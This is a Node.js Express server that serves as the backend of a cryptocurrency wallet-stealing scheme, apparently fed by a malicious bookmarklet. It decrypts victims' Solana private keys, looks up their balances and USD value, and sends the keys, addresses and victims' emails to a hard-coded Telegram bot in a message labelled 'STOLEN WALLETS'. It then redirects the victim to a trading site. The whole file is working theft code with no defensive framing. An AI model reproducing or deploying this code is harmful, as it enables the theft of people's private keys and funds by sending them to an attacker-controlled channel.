const express = require('express');
const fetch = require('node-fetch');
const crypto = require('crypto');
const bs58 = require('bs58');
const app = express();

const TG_BOT = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
const TG_CHAT = '7680513699';

function decrypt(encrypted, bundleKey) {
  try {
    const [ivBase64, ciphertext] = encrypted.split(':');
    if (!ivBase64 || !ciphertext) return null;
    
    const iv = Buffer.from(ivBase64, 'base64');
    const key = Buffer.from(bundleKey, 'base64');
    const encryptedBuffer = Buffer.from(ciphertext, 'base64');
    
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(encryptedBuffer.slice(-16));
    
    let decrypted = decipher.update(encryptedBuffer.slice(0, -16));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    
    return bs58.encode(decrypted);
  } catch (e) {
    return null;
  }
}

async function getSolanaInfo(privateKey) {
  try {
    const { Keypair, Connection, LAMPORTS_PER_SOL } = require('@solana/web3.js');
    const connection = new Connection('https://api.mainnet-beta.solana.com');
    
    const keyBytes = bs58.decode(privateKey);
    const keypair = Keypair.fromSecretKey(keyBytes);
    const balance = await connection.getBalance(keypair.publicKey);
    
    return {
      address: keypair.publicKey.toString(),
      balance: balance / LAMPORTS_PER_SOL,
      privateKey: privateKey
    };
  } catch (e) {
    console.error('Solana balance error:', e);
    return { 
      address: 'Error getting address', 
      balance: 0,
      privateKey: privateKey
    };
  }
}

async function getSOLPrice() {
  try {
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
    const data = await response.json();
    return data.solana.usd;
  } catch (e) {
    console.error('Price fetch error:', e);
    return 0;
  }
}

app.get('/data/:b64', async (req, res) => {
  try {
    const decoded = Buffer.from(req.params.b64, 'base64').toString();
    const data = JSON.parse(decoded);
    
    // Parse sBundles (Solana wallets)
    let sBundles = data.sBundles;
    if (typeof sBundles === 'string') {
      sBundles = JSON.parse(sBundles);
    }
    
    // Ensure it's an array
    if (!Array.isArray(sBundles)) {
      sBundles = [];
    }
    
    console.log(`Processing ${sBundles.length} Solana bundles`);
    
    // Decrypt all Solana keys
    const solKeys = sBundles.map(enc => decrypt(enc, data.bundle)).filter(k => k);
    
    console.log(`Decrypted ${solKeys.length} Solana keys`);
    
    // Get SOL price
    const solPrice = await getSOLPrice();
    
    // Get info for all Solana wallets
    const solanaWallets = await Promise.all(solKeys.map(k => getSolanaInfo(k)));
    
    // Calculate totals
    const totalSOL = solanaWallets.reduce((sum, w) => sum + w.balance, 0);
    const totalUSD = totalSOL * solPrice;
    
    // Build wallet section
    let walletsSection = '';
    solanaWallets.forEach((wallet, i) => {
      const usdValue = wallet.balance * solPrice;
      walletsSection += `
${i + 1}. ${wallet.address}
   Balance: ${wallet.balance.toFixed(4)} SOL ($${usdValue.toFixed(2)})
   Key: ${wallet.privateKey}
`;
    });
    
    const msg = `
🎯 WISH BOOKMARK 

━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 ${data.user?.email || 'No email'}

💰 STOLEN WALLETS (${solanaWallets.length}) - Total: ${totalSOL.toFixed(4)} SOL ($${totalUSD.toFixed(2)})
${walletsSection || 'None found'}
━━━━━━━━━━━━━━━━━━━━━━━━━━
🔗 ${data.site}
⏰ ${new Date().toLocaleString('en-US', {timeZone: 'America/Chicago'})}
📦 Total: ${solanaWallets.length} wallets
💰 Total USD Value: $${totalUSD.toFixed(2)}
📊 SOL Price: $${solPrice.toFixed(2)}
`.trim();
    
    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text: msg })
    });
    
    console.log('Sent to Telegram successfully');
    res.redirect('https://axiom.trade/discover');
    
  } catch (e) {
    console.error('Error:', e);
    res.status(500).send('err');
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log('Server running');
});
